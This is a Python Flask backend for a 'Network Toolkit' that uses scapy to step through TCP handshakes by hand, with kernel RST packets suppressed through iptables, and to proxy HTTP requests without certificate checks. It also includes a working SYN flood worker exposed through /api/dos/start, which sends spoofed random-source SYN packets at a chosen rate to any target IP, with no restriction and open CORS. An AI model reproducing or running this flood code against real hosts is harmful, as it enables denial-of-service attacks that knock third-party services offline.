#!/usr/bin/env python3
"""
Network Toolkit — TCP Raw Packet Backend
Docker: docker compose up --build  →  http://localhost:3000
"""

import os
import sys
import uuid
import atexit
import random
import subprocess
import threading
import time

if os.geteuid() != 0:
    print("ERROR: This server must be run as root (use Docker with NET_ADMIN/NET_RAW caps)")
    sys.exit(1)

print("Root check: OK")

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from scapy.all import IP, TCP, sr1, send, conf, RandIP, RandShort, RandInt
import requests as req_lib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

conf.verb = 0  # silence scapy output

app = Flask(__name__)
CORS(app)

# ── Session store ──────────────────────────────────────────────────────────────
sessions = {}  # session_id -> dict

# ── DoS job store ──────────────────────────────────────────────────────────────
dos_jobs = {}  # job_id -> { thread, stop_event, stats: {sent, start_time} }

# ── iptables RST block helpers ────────────────────────────────────────────────

def install_rst_block(src_port: int):
    try:
        subprocess.run(
            ['iptables', '-A', 'OUTPUT', '-p', 'tcp',
             '--sport', str(src_port), '--tcp-flags', 'RST', 'RST', '-j', 'DROP'],
            check=True, capture_output=True
        )
        print(f"iptables: RST block installed for port {src_port}")
    except subprocess.CalledProcessError as e:
        print(f"iptables install warning: {e.stderr.decode().strip()}")

def remove_rst_block(src_port: int = None):
    try:
        if src_port:
            subprocess.run(
                ['iptables', '-D', 'OUTPUT', '-p', 'tcp',
                 '--sport', str(src_port), '--tcp-flags', 'RST', 'RST', '-j', 'DROP'],
                capture_output=True
            )
            print(f"iptables: RST block removed for port {src_port}")
        else:
            # Flush all DROP rules on OUTPUT (best-effort cleanup)
            subprocess.run(['iptables', '-F', 'OUTPUT'], capture_output=True)
            print("iptables: OUTPUT chain flushed")
    except Exception as e:
        print(f"iptables remove warning: {e}")

def _cleanup_all():
    for sess in sessions.values():
        sp = sess.get('src_port')
        if sp:
            remove_rst_block(sp)

atexit.register(_cleanup_all)

# ── Helpers ────────────────────────────────────────────────────────────────────

def _get_local_ip(dst_ip: str) -> str:
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            s.connect((dst_ip, 80))
            return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

def pkt_to_dict(pkt) -> dict:
    if pkt is None:
        return {}
    flags_int = int(pkt[TCP].flags)
    flag_names = []
    flag_map = [(0x02,'SYN'),(0x10,'ACK'),(0x01,'FIN'),(0x04,'RST'),(0x08,'PSH'),(0x20,'URG')]
    for bit, name in flag_map:
        if flags_int & bit:
            flag_names.append(name)
    return {
        "src_ip":   pkt[IP].src,
        "src_port": pkt[TCP].sport,
        "dst_ip":   pkt[IP].dst,
        "dst_port": pkt[TCP].dport,
        "seq":      pkt[TCP].seq,
        "ack":      pkt[TCP].ack,
        "flags":    "+".join(flag_names) if flag_names else "0",
        "window":   pkt[TCP].window,
        "ttl":      pkt[IP].ttl,
    }

# ── Static frontend ────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory(os.path.dirname(os.path.abspath(__file__)), 'index.html')

# ── API ────────────────────────────────────────────────────────────────────────

@app.route('/api/session/new', methods=['POST'])
def new_session():
    data = request.get_json(force=True)
    dst_ip   = data.get('dst_ip', '').strip()
    dst_port = int(data.get('dst_port', 80))

    if not dst_ip:
        return jsonify({"status": "error", "message": "dst_ip required"}), 400
    if not (1 <= dst_port <= 65535):
        return jsonify({"status": "error", "message": "dst_port out of range"}), 400

    session_id  = str(uuid.uuid4())
    src_port    = random.randint(49152, 65535)
    client_isn  = random.randint(0, 2**32 - 1)

    sessions[session_id] = {
        "dst_ip":     dst_ip,
        "dst_port":   dst_port,
        "src_port":   src_port,
        "client_isn": client_isn,
        "server_isn": None,
        "step":       "CLOSED",
    }

    install_rst_block(src_port)

    return jsonify({
        "status":     "ok",
        "session_id": session_id,
        "src_port":   src_port,
        "client_isn": client_isn,
    })


@app.route('/api/syn', methods=['POST'])
def send_syn():
    data = request.get_json(force=True)
    sid  = data.get('session_id')
    sess = sessions.get(sid)
    if not sess:
        return jsonify({"status": "error", "message": "unknown session"}), 404

    dst_ip     = sess['dst_ip']
    dst_port   = sess['dst_port']
    src_port   = sess['src_port']
    client_isn = sess['client_isn']
    local_ip   = _get_local_ip(dst_ip)

    syn_pkt = IP(dst=dst_ip) / TCP(
        sport=src_port,
        dport=dst_port,
        flags='S',
        seq=client_isn,
        window=65535,
    )

    sent_info = {
        "src_ip":   local_ip,
        "src_port": src_port,
        "dst_ip":   dst_ip,
        "dst_port": dst_port,
        "seq":      client_isn,
        "ack":      0,
        "flags":    "SYN",
        "window":   65535,
        "ttl":      int(syn_pkt[IP].ttl),
    }

    synack = sr1(syn_pkt, timeout=5, verbose=0)

    if synack is None:
        return jsonify({
            "status":           "timeout",
            "sent":             sent_info,
            "received":         {},
            "connection_state": "SYN_SENT",
        })

    if synack.haslayer(TCP):
        flags_int = int(synack[TCP].flags)
        if flags_int & 0x04:  # RST
            sess['step'] = 'CLOSED'
            return jsonify({
                "status":           "rst",
                "sent":             sent_info,
                "received":         pkt_to_dict(synack),
                "connection_state": "CLOSED",
            })

        if (flags_int & 0x12) == 0x12:  # SYN+ACK
            sess['server_isn'] = synack[TCP].seq
            sess['step']       = 'SYN_SENT'
            return jsonify({
                "status":           "ok",
                "sent":             sent_info,
                "received":         pkt_to_dict(synack),
                "connection_state": "SYN_SENT",
            })

    return jsonify({
        "status":           "error",
        "message":          "unexpected response",
        "sent":             sent_info,
        "received":         pkt_to_dict(synack),
        "connection_state": sess['step'],
    })


@app.route('/api/ack', methods=['POST'])
def send_ack():
    data = request.get_json(force=True)
    sid  = data.get('session_id')
    sess = sessions.get(sid)
    if not sess:
        return jsonify({"status": "error", "message": "unknown session"}), 404
    dst_ip     = sess['dst_ip']
    dst_port   = sess['dst_port']
    src_port   = sess['src_port']
    client_isn = sess['client_isn']
    server_isn = sess['server_isn'] or 0
    local_ip   = _get_local_ip(dst_ip)

    ack_pkt = IP(dst=dst_ip) / TCP(
        sport=src_port,
        dport=dst_port,
        flags='A',
        seq=client_isn + 1,
        ack=server_isn + 1,
        window=65535,
    )

    send(ack_pkt, verbose=0)
    sess['step'] = 'ESTABLISHED'

    sent_info = {
        "src_ip":   local_ip,
        "src_port": src_port,
        "dst_ip":   dst_ip,
        "dst_port": dst_port,
        "seq":      client_isn + 1,
        "ack":      server_isn + 1,
        "flags":    "ACK",
        "window":   65535,
        "ttl":      64,
    }

    return jsonify({
        "status":           "ok",
        "sent":             sent_info,
        "received":         {},
        "connection_state": "ESTABLISHED",
    })


@app.route('/api/fin', methods=['POST'])
def send_fin():
    data = request.get_json(force=True)
    sid  = data.get('session_id')
    sess = sessions.get(sid)
    if not sess:
        return jsonify({"status": "error", "message": "unknown session"}), 404
    dst_ip     = sess['dst_ip']
    dst_port   = sess['dst_port']
    src_port   = sess['src_port']
    client_isn = sess['client_isn']
    server_isn = sess['server_isn'] or 0
    local_ip   = _get_local_ip(dst_ip)

    fin_pkt = IP(dst=dst_ip) / TCP(
        sport=src_port,
        dport=dst_port,
        flags='FA',
        seq=client_isn + 1,
        ack=server_isn + 1,
        window=65535,
    )

    sent_info = {
        "src_ip":   local_ip,
        "src_port": src_port,
        "dst_ip":   dst_ip,
        "dst_port": dst_port,
        "seq":      client_isn + 1,
        "ack":      server_isn + 1,
        "flags":    "FIN+ACK",
        "window":   65535,
        "ttl":      64,
    }

    sess['step'] = 'FIN_WAIT'

    fin_ack = sr1(fin_pkt, timeout=5, verbose=0)

    if fin_ack is None:
        sess['step'] = 'CLOSED'
        remove_rst_block(src_port)
        return jsonify({
            "status":           "timeout",
            "sent":             sent_info,
            "received":         {},
            "connection_state": "CLOSED",
        })

    received_info = pkt_to_dict(fin_ack)

    if fin_ack.haslayer(TCP):
        final_ack = IP(dst=dst_ip) / TCP(
            sport=src_port,
            dport=dst_port,
            flags='A',
            seq=client_isn + 2,
            ack=fin_ack[TCP].seq + 1,
            window=0,
        )
        send(final_ack, verbose=0)

    sess['step'] = 'CLOSED'
    remove_rst_block(src_port)

    return jsonify({
        "status":           "ok",
        "sent":             sent_info,
        "received":         received_info,
        "connection_state": "CLOSED",
    })


@app.route('/api/reset', methods=['POST'])
def reset_session():
    data = request.get_json(force=True)
    sid  = data.get('session_id')
    sess = sessions.pop(sid, None)
    if sess:
        remove_rst_block(sess.get('src_port'))
    return jsonify({"status": "ok", "connection_state": "CLOSED"})


@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})


# ── HTTP Request proxy ─────────────────────────────────────────────────────────

@app.route('/api/http-request', methods=['POST'])
def http_request_proxy():
    data    = request.get_json(force=True)
    method  = data.get('method', 'GET').upper()
    url     = data.get('url', '').strip()
    headers = data.get('headers', {})
    body    = data.get('body', None)

    if not url:
        return jsonify({"status": "error", "message": "url required"}), 400

    try:
        resp = req_lib.request(
            method, url,
            headers=headers,
            data=body.encode('utf-8') if body else None,
            timeout=15,
            allow_redirects=True,
            verify=False,
        )
        return jsonify({
            "status":           "ok",
            "status_code":      resp.status_code,
            "reason":           resp.reason,
            "response_headers": dict(resp.headers),
            "body":             resp.text,
            "elapsed_ms":       int(resp.elapsed.total_seconds() * 1000),
            "size_bytes":       len(resp.content),
        })
    except req_lib.exceptions.Timeout:
        return jsonify({"status": "timeout", "message": "Request timed out (15s)"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


# ── DoS attack workers ─────────────────────────────────────────────────────────

def _syn_flood_worker(target_ip, target_port, pps, duration, stop_event, stats):
    interval = 1.0 / pps if pps > 0 else 0
    deadline = time.time() + duration if duration > 0 else float('inf')
    while not stop_event.is_set() and time.time() < deadline:
        pkt = IP(dst=target_ip, src=str(RandIP())) / TCP(
            dport=target_port,
            sport=int(RandShort()),
            flags='S',
            seq=int(RandInt()),
        )
        send(pkt, verbose=0)
        stats['sent'] += 1
        if interval:
            time.sleep(interval)
    stop_event.set()


_ATTACK_WORKERS = {
    'syn_flood': _syn_flood_worker,
}


@app.route('/api/dos/start', methods=['POST'])
def dos_start():
    data        = request.get_json(force=True)
    attack_type = data.get('attack_type', 'syn_flood')
    target_ip   = data.get('target_ip', '').strip()
    target_port = int(data.get('target_port', 80))
    pps         = float(data.get('pps', 100))
    duration    = float(data.get('duration', 0))

    if not target_ip:
        return jsonify({"status": "error", "message": "target_ip required"}), 400
    if not (1 <= target_port <= 65535):
        return jsonify({"status": "error", "message": "target_port out of range"}), 400
    if attack_type not in _ATTACK_WORKERS:
        return jsonify({"status": "error", "message": f"unknown attack_type: {attack_type}"}), 400

    job_id     = str(uuid.uuid4())
    stop_event = threading.Event()
    stats      = {"sent": 0, "start_time": time.time()}

    t = threading.Thread(
        target=_ATTACK_WORKERS[attack_type],
        args=(target_ip, target_port, pps, duration, stop_event, stats),
        daemon=True,
    )
    dos_jobs[job_id] = {"thread": t, "stop_event": stop_event, "stats": stats}
    t.start()

    return jsonify({"status": "ok", "job_id": job_id})


@app.route('/api/dos/stop', methods=['POST'])
def dos_stop():
    data   = request.get_json(force=True)
    job_id = data.get('job_id')
    job    = dos_jobs.get(job_id)
    if not job:
        return jsonify({"status": "error", "message": "unknown job_id"}), 404

    job['stop_event'].set()
    stats   = job['stats']
    elapsed = round(time.time() - stats['start_time'], 2)
    return jsonify({"status": "ok", "stats": {"sent": stats['sent'], "elapsed": elapsed}})


@app.route('/api/dos/status', methods=['GET'])
def dos_status():
    job_id = request.args.get('job_id')
    job    = dos_jobs.get(job_id)
    if not job:
        return jsonify({"status": "error", "message": "unknown job_id"}), 404

    stats   = job['stats']
    elapsed = time.time() - stats['start_time']
    running = not job['stop_event'].is_set()
    pps_actual = round(stats['sent'] / elapsed, 1) if elapsed > 0 else 0
    return jsonify({
        "status":     "running" if running else "stopped",
        "sent":       stats['sent'],
        "elapsed":    round(elapsed, 2),
        "pps_actual": pps_actual,
    })


# ── Main ───────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    print("Starting Network Toolkit backend on http://0.0.0.0:3000")
    app.run(host='0.0.0.0', port=3000, debug=False)
